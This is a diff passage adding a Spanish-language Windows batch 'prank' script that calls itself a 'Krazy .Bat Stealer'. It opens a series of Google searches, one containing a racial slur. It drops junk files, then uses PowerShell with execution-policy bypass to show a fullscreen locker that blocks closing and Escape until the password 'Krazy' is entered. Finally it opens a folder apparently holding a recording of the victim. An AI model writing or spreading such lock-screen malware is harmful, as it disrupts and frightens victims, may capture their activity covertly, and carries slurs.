+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+
+for /L %%i in (1,1,10) do (
+    echo Krazy💖 > "%CARPETA_TXT%\Krazy_%%i.txt"
+)
+
+echo.
+echo Krazy System Wait...
+echo Esperando %SEGUNDOS_CAOS% segundos...
+timeout /t %SEGUNDOS_CAOS% /nobreak >nul
+
+powershell -ExecutionPolicy Bypass -Command ^
+"Add-Type -AssemblyName System.Windows.Forms; ^
+Add-Type -AssemblyName System.Drawing; ^
+$form = New-Object System.Windows.Forms.Form; ^
+$form.FormBorderStyle = 'None'; ^
+$form.WindowState = 'Maximized'; ^
+$form.TopMost = $true; ^
+$form.BackColor = 'Black'; ^
+$form.KeyPreview = $true; ^
+$script:unlocked = $false; ^
+$fontHuge = New-Object System.Drawing.Font('Segoe UI', 80, [System.Drawing.FontStyle]::Bold); ^
+$fontMed = New-Object System.Drawing.Font('Segoe UI', 22); ^
+$fontSmall = New-Object System.Drawing.Font('Segoe UI', 14); ^
+$lbl1 = New-Object System.Windows.Forms.Label; ^
+$lbl1.Text = 'ES UNA BROMA'; ^
+$lbl1.Font = $fontHuge; ^
+$lbl1.ForeColor = 'Red'; ^
+$lbl1.AutoSize = $true; ^
+$lbl1.Location = New-Object System.Drawing.Point(280, 120); ^
+$form.Controls.Add($lbl1); ^
+$lbl2 = New-Object System.Windows.Forms.Label; ^
+$lbl2.Text = 'Password????:'; ^
+$lbl2.Font = $fontMed; ^
+$lbl2.ForeColor = 'White'; ^
+$lbl2.AutoSize = $true; ^
+$lbl2.Location = New-Object System.Drawing.Point(350, 330); ^
+$form.Controls.Add($lbl2); ^
+$lbl3 = New-Object System.Windows.Forms.Label; ^
+$lbl3.Text = '(Pista: nombre en ingles, empieza con K)'; ^
+$lbl3.Font = $fontSmall; ^
+$lbl3.ForeColor = 'Gray'; ^
+$lbl3.AutoSize = $true; ^
+$lbl3.Location = New-Object System.Drawing.Point(500, 400); ^
+$form.Controls.Add($lbl3); ^
+$txt = New-Object System.Windows.Forms.TextBox; ^
+$txt.Font = $fontMed; ^
+$txt.Location = New-Object System.Drawing.Point(500, 450); ^
+$txt.Size = New-Object System.Drawing.Size(300, 45); ^
+$txt.UseSystemPasswordChar = $true; ^
+$txt.BackColor = 'DarkGray'; ^
+$txt.ForeColor = 'White'; ^
+$form.Controls.Add($txt); ^
+$btn = New-Object System.Windows.Forms.Button; ^
+$btn.Text = 'DESBLOQUEAR'; ^
+$btn.Font = $fontMed; ^
+$btn.Location = New-Object System.Drawing.Point(550, 520); ^
+$btn.Size = New-Object System.Drawing.Size(200, 55); ^
+$btn.BackColor = 'DarkRed'; ^
+$btn.ForeColor = 'White'; ^
+$form.Controls.Add($btn); ^
+$btn.Add_Click({ if ($txt.Text -ceq 'Krazy') { $script:unlocked = $true; $form.Close() } else { $txt.Text = ''; $lbl3.Text = 'Contrasena incorrecta. Intenta de nuevo'; $lbl3.ForeColor = 'Red' } }); ^
+$form.Add_KeyDown({ if ($_.KeyCode -eq 'Escape') { $_.SuppressKeyPress = $true } }); ^
+$form.Add_FormClosing({ if ($script:unlocked -ne $true) { $_.Cancel = $true } }); ^
+$form.ShowDialog() | Out-Null"
+
+cls
+color 0A
+echo.
+echo  ============================================
+echo   Nigga EAT STEALER
+echo  ============================================
+echo.
+echo  Video guardado en: %CARPETA_GRABACION%
+echo  Krazy .Bat Stealer.
+echo.
+timeout /t 5 >nul
+start "" "%CARPETA_GRABACION%"
+exit
